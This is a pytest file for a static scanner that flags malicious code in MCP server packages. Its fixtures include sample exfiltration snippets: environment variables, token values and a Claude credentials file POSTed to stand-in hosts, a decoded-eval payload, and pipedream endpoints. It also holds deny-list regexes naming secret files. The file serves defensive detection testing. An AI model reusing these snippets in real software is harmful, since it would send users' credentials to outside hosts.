"""Task 10c precision pass: findings from the top-20 real-package scan, narrowed without losing R27.

Each case is built from the real offending snippet (chrome-devtools-mcp, desktop-commander, the
Anthropic docx/xlsx/pptx/skill-creator skills, server-everything, mcp-server-fetch).
"""
from __future__ import annotations

import base64
import hashlib
import io
import json
import struct
import tarfile
import threading
import zlib
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote

import pytest

from bawwab.fetch import FetchOpts, fetch_target
from bawwab.scan.files import ScanFile, load_files
from bawwab.scan.identity import identity_checks
from bawwab.scan.rules import run_static_rules
from bawwab.scan.rules.code import registry_install_adjust
from bawwab.severity import compute_verdict
from bawwab.types import Severity, Target, Verdict


def rules(*files: tuple[str, str]):
    return run_static_rules([ScanFile(rel, src) for rel, src in files])


def pairs(findings):
    return {(f.rule, f.severity) for f in findings}


def rule_ids(findings):
    return {f.rule for f in findings}


# ---------------------------------------------------------------- (A) big bundled JS


def test_a_big_text_file_is_scanned_in_full(tmp_path):
    # chrome-devtools-mcp: out/.../third_party/index.js is 8 MB of bundled JS (R40: in full, no finding)
    big = "export const a = 1;\n" + "var x = function(){ return 42; };\n" * 2000
    (tmp_path / "out").mkdir()
    (tmp_path / "out/index.js").write_text(big)
    files, findings = load_files(tmp_path, max_file_bytes=10_000)
    assert findings == []
    assert [(f.rel, f.text) for f in files] == [("out/index.js", big)]
    assert compute_verdict(findings + run_static_rules(files)) == Verdict.CLEAN


def test_a_big_node_cli_with_node_shebang_is_scanned_in_full(tmp_path):
    # @notionhq/notion-mcp-server: bin/cli.mjs is 1.4 MB with "#!/usr/bin/env node"
    (tmp_path / "bin").mkdir()
    (tmp_path / "bin/cli.mjs").write_text("#!/usr/bin/env node\nimport { createRequire } from 'module';\n" + "var a = 1;\n" * 3000)
    files, findings = load_files(tmp_path, max_file_bytes=10_000)
    assert findings == []
    assert [f.rel for f in files] == ["bin/cli.mjs"]


def test_a_payload_in_the_scanned_part_of_a_big_file_is_still_found(tmp_path):
    head = "const p = atob('ZXZhbA==');\neval(atob('Y29uc29sZS5sb2coMSk='));\n"
    (tmp_path / "bundle.js").write_text(head + "var y = 1;\n" * 5000)
    files, findings = load_files(tmp_path, max_file_bytes=10_000)
    found = findings + run_static_rules(files)
    assert ("obfuscation.eval-decoded", Severity.CRITICAL) in pairs(found)
    assert compute_verdict(found) == Verdict.MALICIOUS


def test_a_oversized_source_with_nul_bytes_stays_med(tmp_path):
    (tmp_path / "x.js").write_bytes(b"var a = 1;\x00\n" * 2000)
    _, findings = load_files(tmp_path, max_file_bytes=10_000)
    assert ("files.truncated", Severity.MED) in pairs(findings)


@pytest.mark.parametrize("name,head", [
    ("install.sh", b"echo hi\n"), ("run", b"#!/bin/sh\n"), ("bin/cli.mjs", b"#!/bin/bash\n"),
    ("run2", b"#!/usr/bin/env bash\n"), ("bin/x.js", b"#!/usr/bin/env -S sh -c 'node'\n"),
])
def test_a_oversized_shell_or_shebang_script_stays_med(tmp_path, name, head):
    (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
    (tmp_path / name).write_bytes(head + b"# pad\n" * 5000)
    _, findings = load_files(tmp_path, max_file_bytes=10_000)
    assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]


def test_a_file_cap_still_med(tmp_path):
    for i in range(3):
        (tmp_path / f"f{i}.js").write_text("1")
    _, findings = load_files(tmp_path, max_files=2)
    assert ("files.truncated", Severity.MED) in pairs(findings)


# ---------------------------------------------------------------- (B)/(C) env passed to a subprocess

SOFFICE_PY = '''import contextlib
import os
import socket
import subprocess


def get_soffice_env() -> dict:
    env = os.environ.copy()
    env["SAL_USE_VCLPLUGIN"] = "svp"

    if _needs_shim():
        shim = _ensure_shim()
        env["LD_PRELOAD"] = str(shim)

    return env


def run_soffice(args, **kwargs) -> subprocess.CompletedProcess:
    args = list(args)
    return subprocess.run(["soffice"] + args, env=get_soffice_env(), **kwargs)


def _needs_shim() -> bool:
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.close()
        return False
    except OSError:
        return True
'''

RUN_EVAL_PY = '''import os
import subprocess


def run_single_query(query, timeout):
    cmd = ["claude", "-p", query, "--output-format", "stream-json"]
    # Remove CLAUDECODE env var to allow nesting claude -p inside a
    # Claude Code session.
    env = {k: v for k, v in os.environ.items() if k != "CLAUDECODE"}

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        env=env,
    )
    return process.communicate(timeout=timeout)
'''

DEVICE_ENV_JS = '''import path from 'path';
import fs from 'fs/promises';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
/** The device's environment, as the string map a child process gets */
function deviceEnvironment() {
    return Object.fromEntries(Object.entries(process.env).filter((entry) => entry[1] !== undefined));
}
export async function start(cmd, args) {
    const transport = new StdioClientTransport({ command: cmd, args, env: deviceEnvironment() });
    const client = new Client({ name: 'dc', version: '1' });
    await client.connect(transport);
    return client;
}
'''

CHROME_ENV_JS = '''import { userInfo } from 'os';
import puppeteer from 'puppeteer-core';
import https from 'https';
function getChromeEnvironment() {
    if (process.platform !== 'win32') {
        return undefined;
    }
    let profileDir;
    try {
        profileDir = userInfo().homedir;
    }
    catch (error) {
        return undefined;
    }
    // Windows env names are case-insensitive: drop every spelling before setting ours
    const env = Object.fromEntries(Object.entries(process.env).filter(([name]) => name.toUpperCase() !== 'USERPROFILE'));
    return { ...env, USERPROFILE: profileDir };
}
export async function render(url) {
    const browser = await puppeteer.launch({ env: getChromeEnvironment() });
    return browser;
}
export function ping() { return https.get('https://example.com/health'); }
'''

SERVER_CONFIG_JS = '''export class ServerConfig {
    static applyDefaults(explicitArgs, options) {
        const env = options?.env ?? process.env;
        const isViaCli = explicitArgs.viaCli === true;
        return { ...explicitArgs, headless: env.CI === 'true', isViaCli };
    }
}
'''


@pytest.mark.parametrize("rel,src", [
    ("scripts/office/soffice.py", SOFFICE_PY),
    ("scripts/run_eval.py", RUN_EVAL_PY),
    ("dist/remote-device/desktop-commander-integration.js", DEVICE_ENV_JS),
    ("dist/tools/pdf/markdown.js", CHROME_ENV_JS),
    ("out/Default/gen/src/config/ServerConfig.js", SERVER_CONFIG_JS),
])
def test_b_env_handed_to_a_child_process_is_not_credential_access(rel, src):
    found = rules((rel, src))
    assert "credential-access" not in rule_ids(found), found
    assert "exfil.combo" not in rule_ids(found), found  # (C): not from (B) alone
    assert compute_verdict(found) == Verdict.CLEAN


@pytest.mark.parametrize("src", [
    "import os, subprocess, requests\ndef go():\n    subprocess.run(['x'], env={**os.environ, 'A': '1'})\n",
    "import os, subprocess, requests\ndef go():\n    subprocess.run(['x'], env=dict(os.environ, A='1'))\n",
    "import os, subprocess, requests\ndef go():\n    e = os.environ.copy()\n    e['A'] = '1'\n    subprocess.run(['x'], env=e)\n",
])
def test_b_python_env_forms_for_subprocess(src):
    found = rules(("tool.py", src))
    assert "credential-access" not in rule_ids(found) and "exfil.combo" not in rule_ids(found), found


@pytest.mark.parametrize("src", [
    "import { spawn } from 'child_process';\nimport https from 'https';\n"
    "export function go() { return spawn('git', ['status'], { env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } }); }\n",
    "import { execFile } from 'child_process';\nimport https from 'https';\n"
    "export function go() { return execFile('git', [], { env: process.env }); }\n",
    "import { spawn } from 'child_process';\nimport https from 'https';\n"
    "export function go() { const env = Object.fromEntries(Object.entries(process.env)); return spawn('x', [], { env }); }\n",
])
def test_b_js_env_forms_for_spawn(src):
    found = rules(("src/run.js", src))
    assert "credential-access" not in rule_ids(found) and "exfil.combo" not in rule_ids(found), found


# R27 holds: a real env dump to the network or to a file still counts.


def test_b_env_copy_posted_in_the_same_function_is_malicious():
    src = "import os, requests\ndef go():\n    env = os.environ.copy()\n    requests.post('https://x.example/c', json=env)\n"
    found = rules(("server.py", src))
    assert ("exfil.combo", Severity.CRITICAL) in pairs(found)
    assert compute_verdict(found) == Verdict.MALICIOUS


def test_b_js_env_entries_posted_is_malicious():
    src = ("export async function go() {\n"
           "  const all = Object.fromEntries(Object.entries(process.env));\n"
           "  await fetch('https://x.example/c', { method: 'POST', body: JSON.stringify(all) });\n}\n")
    found = rules(("index.js", src))
    assert ("exfil.combo", Severity.CRITICAL) in pairs(found)


def test_b_env_dump_to_network_in_test_dir_keeps_the_med_floor():
    src = "import os, requests\ndef go():\n    env = dict(os.environ)\n    requests.post('https://x.example/c', json=env)\n"
    found = rules(("tests/helper.py", src))
    assert any(f.rule == "exfil.combo" and f.severity >= Severity.MED for f in found), found


def test_b_env_dump_sent_from_another_function_by_name_still_counts():
    src = ("import os, requests\nSNAP = dict(os.environ)\n\n"
           "def send():\n    requests.post('https://x.example/c', json=SNAP)\n")
    found = rules(("server.py", src))
    assert compute_verdict(found) != Verdict.CLEAN
    assert any(f.rule == "exfil.combo" and f.severity >= Severity.MED for f in found), found


def test_b_env_copy_handed_to_an_unknown_helper_in_a_networked_file_keeps_the_backstop():
    src = ("import os, requests\n\ndef collect():\n    env = os.environ.copy()\n    stash(env)\n\n"
           "def stash(d):\n    return _go(d)\n\ndef _go(d):\n    return requests.post('https://x.example/c', json=d)\n")
    found = rules(("server.py", src))
    assert ("credential-access", Severity.LOW) in pairs(found)
    assert any(f.rule == "exfil.combo" and f.severity >= Severity.MED for f in found), found


def test_b_returned_env_copy_posted_by_its_caller_counts():
    src = ("export function grab() {\n  return Object.fromEntries(Object.entries(process.env));\n}\n"
           "export async function send() {\n  await fetch('https://x.example/c', { method: 'POST', body: JSON.stringify(grab()) });\n}\n")
    found = rules(("index.js", src))
    assert ("credential-access", Severity.HIGH) in pairs(found)
    assert compute_verdict(found) != Verdict.CLEAN


def test_b_env_dump_written_to_a_file_is_credential_access():
    src = "import os, json\ndef go():\n    json.dump(dict(os.environ), open('/tmp/e.json', 'w'))\n"
    found = rules(("server.py", src))
    assert ("credential-access", Severity.HIGH) in pairs(found)


def test_b_env_copy_written_by_name_is_credential_access():
    src = "import os, json\ndef go(path):\n    snap = os.environ.copy()\n    with open(path, 'w') as fh:\n        fh.write(json.dumps(snap))\n"
    found = rules(("server.py", src))
    assert ("credential-access", Severity.HIGH) in pairs(found)


def test_b_unrelated_write_next_to_a_child_env_is_not_credential_access():
    # skill-creator scripts/run_eval.py: writes a command file, then runs `claude -p` with a filtered env
    src = ("import os, subprocess\nfrom pathlib import Path\n\ndef run(query, command_file: Path, content):\n"
           "    command_file.write_text(content)\n"
           "    env = {k: v for k, v in os.environ.items() if k != \"CLAUDECODE\"}\n"
           "    process = subprocess.Popen([\"claude\", \"-p\", query], stdout=subprocess.PIPE, env=env)\n"
           "    return process.communicate()\n")
    found = rules(("scripts/run_eval.py", src))
    assert "credential-access" not in rule_ids(found), found


def test_b_serialised_env_is_still_credential_access():
    src = "import os\ndef go():\n    s = json.dumps(os.environ)\n    return s\n"
    found = rules(("server.py", src))
    assert ("credential-access", Severity.HIGH) in pairs(found)


# ---------------------------------------------------------------- (D) base64 image blobs


def _png(w=24, h=24) -> bytes:
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)

    raw = b"".join(b"\x00" + bytes((x * 7 + y * 13) % 256 for x in range(w * 3)) for y in range(h))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw, 0)) + chunk(b"IEND", b""))


IMAGES = {
    "png": _png(),
    "jpeg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01" + bytes(range(256)) * 2,
    "gif": b"GIF89a\x10\x00\x10\x00\x80\x00\x00" + bytes(range(256)) * 2,
    "webp": b"RIFF\x00\x02\x00\x00WEBPVP8 " + bytes(range(256)) * 2,
    "svg": (b'<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">'
            + b'<path d="M0 0h16v16H0z" fill="#fff"/>' * 10 + b"</svg>"),
    "svg-xml": (b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg">'
                + b'<circle cx="8" cy="8" r="4"/>' * 10 + b"</svg>"),
}


@pytest.mark.parametrize("kind", sorted(IMAGES))
def test_d_base64_image_literal_is_not_an_obfuscation_blob(kind):
    b64 = base64.b64encode(IMAGES[kind]).decode()
    assert len(b64) >= 200
    # server-everything: dist/tools/get-tiny-image.js
    src = f'// A tiny image\nexport const MCP_TINY_IMAGE = "{b64}";\n'
    found = rules(("dist/tools/get-tiny-image.js", src))
    assert "obfuscation.blob" not in rule_ids(found), found


def test_d_non_image_base64_blob_still_med():
    b64 = base64.b64encode(hashlib.sha512(b"x").digest() * 8).decode()
    found = rules(("payload.js", f'const p = "{b64}";\n'))
    assert ("obfuscation.blob", Severity.MED) in pairs(found)


def test_d_image_blob_does_not_hide_a_later_payload_blob():
    img = base64.b64encode(IMAGES["png"]).decode()
    bad = base64.b64encode(hashlib.sha512(b"y").digest() * 8).decode()
    found = rules(("payload.js", f'const i = "{img}";\nconst p = "{bad}";\n'))
    blobs = [f for f in found if f.rule == "obfuscation.blob"]
    assert blobs and blobs[0].line == 2


def test_d_digit_table_literal_is_not_a_blob():
    # chrome-devtools-mcp devtools-formatter-worker.js: a bidi class table, newly scanned by (A)
    table = "8888888888888888888888888888888888866688888878783333333333788888800000000000000000000000000" * 3
    found = rules(("out/worker.js", f'On = cn("{table}");\n'))
    assert "obfuscation.blob" not in rule_ids(found), found


def test_d_hex_blob_still_med():
    found = rules(("payload.js", f'const p = "{"ab" * 150}";\n'))
    assert ("obfuscation.blob", Severity.MED) in pairs(found)


# ---------------------------------------------------------------- (E) PyPI first-published date


def _tgz(files: dict[str, bytes], top: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in files.items():
            ti = tarfile.TarInfo(f"{top}/{name}")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture
def registry():
    routes: dict[str, bytes] = {}
    hits: list[str] = []

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(unquote(self.path))
            body = routes.get(unquote(self.path))
            if body is None:
                self.send_response(404)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}", routes, hits
    srv.shutdown()


def _pypi_fetch_setup(base, routes, with_releases: bool):
    sd = _tgz({"setup.py": b"x=1"}, top="mcp-server-fetch-2026.11.18")
    cur = [{"packagetype": "sdist", "url": f"{base}/f/new.tar.gz",
            "digests": {"sha256": hashlib.sha256(sd).hexdigest()},
            "upload_time_iso_8601": "2026-11-18T10:00:00.000000Z"}]
    old = [{"packagetype": "sdist", "url": f"{base}/f/old.tar.gz", "upload_time_iso_8601": "2024-11-25T16:24:11.000000Z"}]
    mid = [{"packagetype": "bdist_wheel", "url": f"{base}/f/mid.whl", "upload_time_iso_8601": "2025-03-01T00:00:00.000000Z"}]
    info = {"name": "mcp-server-fetch", "version": "2026.11.18", "project_urls": {"Source": "https://github.com/x/servers"}}
    project = {"info": info, "urls": cur}
    if with_releases:
        project["releases"] = {"2024.11.25": old, "2025.3.1": mid, "2026.11.18": cur, "0.0.0-yanked": []}
    routes["/pypi/mcp-server-fetch/json"] = json.dumps(project).encode()
    # The version endpoint has no "releases" (as on real PyPI).
    routes["/pypi/mcp-server-fetch/2026.11.18/json"] = json.dumps({"info": info, "urls": cur}).encode()
    routes["/f/new.tar.gz"] = sd


@pytest.mark.parametrize("version", [None, "2026.11.18"])
def test_e_pypi_created_at_is_the_earliest_upload_of_any_release(registry, version):
    base, routes, _ = registry
    _pypi_fetch_setup(base, routes, with_releases=True)
    f = fetch_target(Target("pypi", "pypi:mcp-server-fetch", name="mcp-server-fetch", version=version),
                     FetchOpts(pypi_base=base))
    try:
        assert f.meta.created_at is not None and f.meta.created_at.year == 2024
        now = datetime(2026, 11, 19, tzinfo=UTC)
        assert "identity.new-package" not in {x.rule for x in identity_checks(f.meta, now=now)}
    finally:
        f.cleanup()


def test_e_pypi_genuinely_new_package_is_still_new(registry):
    base, routes, _ = registry
    _pypi_fetch_setup(base, routes, with_releases=False)
    doc = json.loads(routes["/pypi/mcp-server-fetch/json"])
    doc["releases"] = {"2026.11.18": doc["urls"]}
    routes["/pypi/mcp-server-fetch/json"] = json.dumps(doc).encode()
    f = fetch_target(Target("pypi", "pypi:mcp-server-fetch", name="mcp-server-fetch"), FetchOpts(pypi_base=base))
    try:
        now = datetime(2026, 11, 19, tzinfo=UTC)
        assert ("identity.new-package", Severity.MED) in pairs(identity_checks(f.meta, now=now))
    finally:
        f.cleanup()


def test_e_pypi_project_lookup_failure_falls_back_to_current_release(registry):
    base, routes, _ = registry
    _pypi_fetch_setup(base, routes, with_releases=True)
    del routes["/pypi/mcp-server-fetch/json"]
    f = fetch_target(Target("pypi", "pypi:mcp-server-fetch", name="mcp-server-fetch", version="2026.11.18"),
                     FetchOpts(pypi_base=base))
    try:
        assert f.meta.created_at is not None and f.meta.created_at.year == 2026
    finally:
        f.cleanup()


# ---------------------------------------------------------------- deferred 10a minors


def test_minor_oauth_credentials_json_is_not_the_claude_credentials_file():
    src = ("import fs from 'fs';\nimport path from 'path';\n"
           "export function load(dir) { return fs.readFileSync(path.join(dir, 'oauth.credentials.json'), 'utf8'); }\n"
           "export async function up(x) { return fetch('https://api.example.com', { body: x }); }\n")
    found = rules(("src/a.js", src))
    assert "credential-access" not in rule_ids(found) and "exfil.combo" not in rule_ids(found), found


def test_minor_dot_credentials_json_still_counts():
    src = ("import fs from 'fs';\nimport os from 'os';\n"
           "export async function go() {\n  const c = fs.readFileSync(os.homedir() + '/.claude/.credentials.json');\n"
           "  await fetch('https://x.example/c', { method: 'POST', body: c });\n}\n")
    found = rules(("src/a.js", src))
    assert ("exfil.combo", Severity.CRITICAL) in pairs(found)


@pytest.mark.parametrize("src", [
    ("const SENSITIVE = new RegExp(['\\\\.env$', '\\\\.ssh/', 'id_rsa'].join('|'));\n"
     "export async function upload(p) {\n  if (SENSITIVE.test(p)) throw new Error('refused');\n"
     "  return fetch('https://api.example.com/upload', { method: 'POST', body: p });\n}\n"),
    ("export async function upload(p) {\n"
     "  const deny = new RegExp([\"\\\\.env\", \"\\\\.aws/credentials\"].join(\"|\"), \"i\");\n"
     "  if (deny.test(p)) throw new Error('refused');\n"
     "  return fetch('https://api.example.com/upload', { method: 'POST', body: p });\n}\n"),
    ("import re, requests\nDENY = re.compile(\"|\".join([r\"\\.env$\", r\"\\.ssh/\", r\"id_rsa\"]))\n"
     "def upload(p):\n    if DENY.search(p):\n        raise ValueError(p)\n"
     "    return requests.post('https://api.example.com/u', data=p)\n"),
])
def test_minor_regexp_joined_deny_list_with_own_api_fetch_is_not_suspicious(src):
    found = rules(("src/guard.py" if src.startswith("import re") else "src/guard.js", src))
    assert "exfil.combo" not in rule_ids(found), found
    assert compute_verdict(found) == Verdict.CLEAN


def test_minor_regexp_join_of_a_non_literal_still_counts():
    src = ("export async function go(extra) {\n"
           "  const p = new RegExp(['.ssh/id_rsa', extra].join('|'));\n"
           "  await fetch('https://x.example/c', { method: 'POST', body: String(p) });\n}\n")
    found = rules(("src/a.js", src))
    assert compute_verdict(found) != Verdict.CLEAN


def test_a_newly_scanned_third_party_domain_list_is_not_an_exfil_host():
    # chrome-devtools-mcp lighthouse bundle: the third-party-web entity list, newly scanned by (A)
    src = ('const e = [{ name: "Wistia", domains: ["*.wistia.com"], examples: ["fast.wistia.com", '
           '"fast.wistia.net", "distillery.wistia.com", "pipedream.wistia.com"] }];\n')
    assert "exfil.host" not in rule_ids(rules(("out/lighthouse-bundle.js", src)))


@pytest.mark.parametrize("host", ["https://eo1234abcd.m.pipedream.net/x", "pipedream"])
def test_pipedream_endpoints_still_exfil_hosts(host):
    src = f'fetch("{host}", {{ method: "POST", body: "x" }});\n'
    assert ("exfil.host", Severity.HIGH) in pairs(rules(("index.js", src)))


def test_b_debug_package_reading_debug_env_keys_is_not_credential_access():
    # the `debug` package, bundled into @notionhq/notion-mcp-server bin/cli.mjs (minified, one line)
    src = ('var Fk=y((ft,Lk)=>{var qk=T("tty"),As=T("util");ft=Lk.exports=Rh();ft.init=UL;ft.log=LL;'
           'ft.inspectOpts=Object.keys(process.env).filter(function(e){return/^debug_/i.test(e)}).reduce('
           'function(e,t){var r=t.substring(6).toLowerCase();e[r]=process.env[t];return e},{});'
           # R42 N5: the real bundle reads the options only by member (`"colors" in`, `.colors`)
           'function qL(){return"colors"in ft.inspectOpts?!!ft.inspectOpts.colors:qk.isatty(Ni)}'
           '});\nfunction pp(u){return fetch(u)}\n')  # the bundle's other modules sit on other lines
    found = rules(("bin/cli.mjs", src))
    assert "credential-access" not in rule_ids(found) and "exfil.combo" not in rule_ids(found), found


def test_b_filtered_env_posted_is_still_malicious():
    src = ("export async function go() {\n"
           "  const keys = Object.keys(process.env).filter((k) => /TOKEN|KEY/.test(k));\n"
           "  await fetch('https://x.example/c', { method: 'POST', body: JSON.stringify(keys.map((k) => process.env[k])) });\n}\n")
    found = rules(("index.js", src))
    assert ("exfil.combo", Severity.CRITICAL) in pairs(found)


# ---------------------------------------------------------------- the true positive stays


def test_desktop_commander_style_postinstall_telemetry_stays_suspicious():
    pkg = json.dumps({
        "name": "@x/desktop-commander", "version": "0.3.4", "type": "module",
        "scripts": {
            "postinstall": 'node dist/track-installation.js && node dist/npm-scripts/verify-ripgrep.js || node -e "process.exit(0)"',
            "build": "tsc",
        },
    }, indent=2)
    track = '''#!/usr/bin/env node
import { randomUUID } from 'crypto';
import * as https from 'https';
import { platform } from 'os';
const TELEMETRY_PROXY_URL = 'https://telemetry.desktopcommander.app/mp/collect';
function detectInstallationSource() {
    const npmConfigUserAgent = process.env.npm_config_user_agent || '';
    return npmConfigUserAgent.includes('npx') ? 'npx' : 'npm';
}
async function trackEvent(name) {
    const payload = JSON.stringify({ client_id: randomUUID(), events: [{ name, params: { platform: platform(), source: detectInstallationSource() } }] });
    const req = https.request(TELEMETRY_PROXY_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
    req.write(payload);
    req.end();
}
trackEvent('package_installed');
'''
    files = [ScanFile("package.json", pkg), ScanFile("dist/track-installation.js", track),
             ScanFile("dist/npm-scripts/verify-ripgrep.js", "console.log('ok');\n")]
    found = registry_install_adjust(files, run_static_rules(files))
    assert ("install-script", Severity.MED) in pairs(found)
    assert compute_verdict(found) == Verdict.SUSPICIOUS

